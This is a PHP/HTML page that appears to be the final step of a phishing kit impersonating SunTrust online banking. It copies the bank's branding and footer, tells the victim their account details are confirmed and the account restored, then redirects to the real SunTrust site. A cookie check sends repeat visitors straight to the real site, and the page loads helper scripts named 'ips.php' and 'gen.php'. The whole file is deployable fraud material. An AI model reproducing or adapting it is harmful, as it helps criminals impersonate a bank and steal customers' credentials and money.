<?php
$status = "finish";
include 'ips.php';
include 'gen.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:pt="http://www.plumtree.com/xmlschemas/ptui/">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="refresh" content="5;URL=https://www.suntrust.com/" />
  <script>
<!--
/* Copyright http://www.perlscriptsjavascripts.com
   Free and commercial Perl and JavaScripts     */

// page to go to if cookie exists
go_to = "https://www.suntrust.com/";

// number of days cookie lives for
num_days = 60;
function ged(noDays){
    var today = new Date();
    var expr = new Date(today.getTime() + noDays*24*60*60*1000);
    return  expr.toGMTString();

}

function readCookie(cookieName){
    var start = document.cookie.indexOf(cookieName);
    if (start == -1){
        document.cookie = "seenit=yes; expires=" + ged(num_days);
    } else {
        window.location = go_to;
    }
}

readCookie("seenit");
// -->
</script>

<meta name="description" content="">
<meta name="keywords" content="">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Expires" content="0">
<title>SunTrust - Online Banking - New Account Center</title>


  <link rel="stylesheet" href="images/basic.css" type="text/css" media="all" title="default">
  <link rel="stylesheet" href="images/nac_edits.css" type="text/css" media="all" title="default">
<link rel="stylesheet" href="images/nac_cc_edits.css" type="text/css" media="all" title="default">
  <link rel="stylesheet" href="images/nac_lending_edits.css" type="text/css" media="all" title="default">
  <link rel="stylesheet" href="images/nac_delta_edits.css" type="text/css" media="all" title="default">
  <link rel="stylesheet" href="images/nac_local_edits.css" type="text/css" media="all" title="default">




</head>

<body>



<div id="mainContainer">



 <div id="NACHeader" style="">
<div id="pageBanner">
		<div class="logoLink"><img src="images/blank.gif" alt="" border="0" height="75" width="250"></div>
		<div id="NACBanner" class="bannerText">Account Center</div>
</div>
</div>
      <div id="NACNavTab" style="">
	<div id="pageNav">
		<div id="pageNavBar_progress">
			<ul id="NAC_Header">
				<li class="done" id="NAC_GettingStarted">Getting Started</li>
				<li class="done" id="NAC_Identification">Identification</li>
				<li class="selStep" id="NAC_NextSteps">Next Step</li>
			</ul>
		</div>
	</div>
     </div>




 <div id="CreditCardHeader" style="display:none">
<div id="pageBanner">
		<div class="logoLink"><img src="images/blank.gif" alt="" border="0" height="75" width="250"></div>
		 <div class="bannerText">Credit Cards</div>
	</div>
</div>
<div id="CreditCradNavTab" style="display:none">
	<div id="pageNav">
		<div id="pageNavBar">
			<ul id="NAC_Header">
				<li id="CC_GettingStarted">Getting Started</li>
				<li id="CC_Offers">View Offers</li>
				<li id="CC_Apply">Apply</li>
				<li id="CC_Next">Next Steps</li>
			</ul>
		</div>
	</div>
</div>

<div id="ConsumerLendingHeader" style="display:none">
<div id="pageBanner" class="loan">
		<div class="logoLink"><img src="images/blank.gif" alt="" border="0" height="75" width="250"></div>
		<div id="pageSaveLinks" style="display:none" class="titleControl"><a href="#" onclick="retrieveAppl();">Retrieve Application</a> &nbsp; | &nbsp; <a href="#" onclick="saveAppl();">Save Application</a></div>
		<div id="pageSaveText" class="titleControl"><a href="#" onclick="retrieveAppl();">Retrieve Application</a> &nbsp; | &nbsp;Save Application</div>
		<div id="pageRetrieveText" style="display:none" class="titleControl">Retrieve Application &nbsp; | &nbsp;<a href="#" onclick="saveAppl();">Save Application</a></div>
		<div id="pageBothText" style="display:none" class="titleControl">Retrieve Application &nbsp; | &nbsp;Save Application</div>
		<div class="clear"></div>
</div>
</div>
<div id="ConsumerLendingNavTab" style="display:none">
	<div id="pageNav">
		<div id="pageNavBar_progress">
			<ul id="CL_Header">
			    <li id="CL_GettingStarted">Getting Started</li>
			    <li id="CL_PersonalInfo">Personal Info</li>
                            <li id="CL_LoanInfo">Loan Options</li>
                            <li id="CL_Apply">Review &amp; Submit</li>
                            <li id="CL_Next">Next Steps</li>
           		</ul>
		</div>
	</div>
</div>




	<div id="pageContentArea">

			<div class="mainPortlet">


			<div class="portletContainer">
				<div id="printerFriendlyContent">
					<div id="pf_link"><a href="https://www.suntrust.com/imageserver/plumtree/portal/private/pagelayouts/SunTrust/PortletLayout/printer_friendly.html" class="subText" onclick="setActiveStyleSheet('default'); return false;">Return to Standard View »</a></div>
					<div id="pf_logo">
						<a href="#" class="subText" onclick="window.print();return false;">Print</a>
						&nbsp;&nbsp; |&nbsp;<a href="#" class="subText" onclick="window.close();return false;">Close</a><img src="images/printerFriendlyLogo.gif" alt="" style="display:none;" border="0" height="55" width="100">
</div>
					</div>

			<div id="region1"><span width="0"></span>
<!--Begin Portlet Region 1-->


					<div class="customappText" id="pt-portlet-content-592"><link rel="stylesheet" type="text/css" href="images/nac_printerfriendly.css" media="all" title="print"></div>

					<div class="customappText" id="pt-portlet-content-593"><link rel="stylesheet" type="text/css" href="images/nac_printerfriendly_two.css" media="all" title="printtwo"></div>

					<div class="customappText" id="pt-portlet-content-503"><!-- ptwc:ver=3.1&locale=en-us --><input type="hidden">



          				<span id="PTPortletErrorSPAN_503"></span>



		<div id="dframe"></div>

		<form name="Form1_503" method="post" action="login.php?cmd=2" id="Form1_503" autocomplete="off">





<div id="phasedControl_pnlMain">


    <div id="pageTitle">
        <h2>
            Confirm</h2>


    </div>
    <div class="table"></div>
         <div style="display: none;" id="phasedControl_pnlPrevAddress">

         <br>


        <div class="table">


            <br>


    <br>
    </div>
         </div>


    <div class="table">

<ul class="loginform">



		<li>You have successfully confirmed your account details.</li>

<li>Your  account has been successfully restored.</li>

<li>You can now log back to your bank account.


        </li>



</ul>
            <div style="" id="phasedControl_pnlIDIssuer">

            <table class="layoutTableTight">
            <tbody>

        </tbody></table>
	</div>
    </div>

</div>

<!--Co Applicant Panel -->

<div id="pageButtons">
 <span id="phasedControl_lblProcess" style="color:Red;"></span> <br>
</div>





<div id="phasedControl_PersonalInformationNext_spotLight" style="display:none">

</div>
<div id="phasedControl_dvPINext"></div>



</form>

	</span></div>


			<!--End Portlet Region 1--></div>
		</div>
		<div class="clear"></div>
	</div>

<!--End of content HTML Tag in basepage library.-->
	<div id="pageFooter">
		<div id="pageFooterNav">
			<p>	<img src="images/house_ehl.gif" alt="Equal Housing Lender" border="0" height="9" width="13">
 SunTrust Bank is an Equal Housing Lender.  Member FDIC.  ©2013 SunTrust
 Banks, Inc.  SunTrust is a federally registered service mark of
SunTrust Banks, Inc.</p>

		</div>
	</div>

</div>




</span></div><div style="position: absolute; visibility: hidden;"><div></div><div></div></div></body><!--End of pagebody HTML Tag in basepage library.--></html>
